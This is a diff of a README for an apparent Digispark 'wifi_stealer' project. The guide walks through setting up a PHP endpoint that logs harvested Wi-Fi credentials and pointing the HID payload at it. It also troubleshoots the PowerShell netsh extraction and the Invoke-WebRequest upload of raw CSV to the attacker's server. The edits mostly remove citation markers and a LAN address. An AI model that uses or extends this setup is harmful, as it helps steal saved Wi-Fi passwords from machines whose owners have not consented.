@@ -53,7 +53,7 @@ curl -X POST http://localhost/wifi-recv.php -d "data=test"
 cat /var/www/html/wifi_creds.log
 ```
 
-If you see `data=test` in the output, the server is working.[page:0]
+If you see `data=test` in the output, the server is working.
 
 Open:
 
@@ -67,7 +67,7 @@ Replace `YOUR_IP` with the IP address of your Kali machine.
 
 ### On Windows (XAMPP)
 
-1. Download XAMPP from [apachefriends.org](https://www.apachefriends.org).
+1. Download XAMPP from apachefriends.org.
 2. Install it with Apache and PHP selected.
 3. Start Apache from the XAMPP control panel.
 
@@ -147,7 +147,7 @@ payloads/wifi_stealer_digispark.ino
 $u='http://YOUR_IP/wifi-recv.php';
 ```
 
-Replace `YOUR_IP` with the IP of your Kali or Windows server (for example `http://192.168.1.8/wifi-recv.php` if you are on the same LAN).
+Replace `YOUR_IP` with the IP of your Kali or Windows server (for example `http://YOUR_IP/wifi-recv.php` on your LAN).
 
 3. Make sure the payload contains the Wi‑Fi extraction and POST logic that sends **raw CSV** to `wifi-recv.php`, in this format:
 
@@ -242,19 +242,17 @@ Most of the time the server is fine and the issue is on the Windows / payload si
   cat /var/www/html/wifi_creds.log
   ```
 
-  If you see `data=test` in the log, the PHP script and permissions are OK.[page:0]
-
 - If nothing is written:
   - Make sure Apache is running:  
     `sudo systemctl status apache2`
   - Check the log file exists and is writable:  
-    `ls -l /var/www/html/wifi_creds.log` and fix ownership/permissions as in the setup section.[page:0]
+    `ls -l /var/www/html/wifi_creds.log` and fix ownership/permissions as in the setup section.
 
 ---
 
 ### PowerShell error: “Unable to connect to the remote server”
 
-This means Windows can’t reach your server at the URL you used in `Invoke-WebRequest`, not that the PowerShell logic is broken.[page:0]
+This means Windows can’t reach your server at the URL you used in `Invoke-WebRequest`.
 
 On the Windows machine, in PowerShell:
 
@@ -267,10 +265,6 @@ Test-NetConnection YOUR_IP -Port 80
 # or, if you really configured Apache on a custom port:
 Test-NetConnection YOUR_IP -Port 8080
 ```
-
-- If `ping` fails or `TcpTestSucceeded : False`, either:
-  - Windows and the server are not on the same network, or
-  - A firewall is blocking the connection.[page:0]
 
 Also double‑check the URL:
 
@@ -286,9 +280,9 @@ Reflash the Digispark after any IP/URL change.
 
 ### PowerShell error: “You cannot call a method on a null-valued expression”
 
-This usually comes from the WiFi profile parsing line when a regex or split doesn’t match some `netsh` output lines, so you end up calling a property or method on `$null`.[page:0]
+This usually comes from the WiFi profile parsing line when a split doesn’t match some `netsh` output lines, so you end up calling a property or method on `$null`.
 
-Use the safer approach the project is based on:
+Use the safer approach:
 
 ```powershell
 $profiles = (netsh wlan show profiles) |
@@ -324,7 +318,7 @@ If `type` (or `Get-Content`) of your CSV on Windows shows valid data, but nothin
 If this manual POST writes to the log, the PHP side is fine. Then the issue is:
 
 - Wrong IP/URL hard‑coded in the Digispark sketch, or
-- HID keystrokes being dropped because the Digispark is typing too fast.[page:0]
+- HID keystrokes being dropped because the Digispark is typing too fast.
 
 **Keystroke / timing tips:**
 
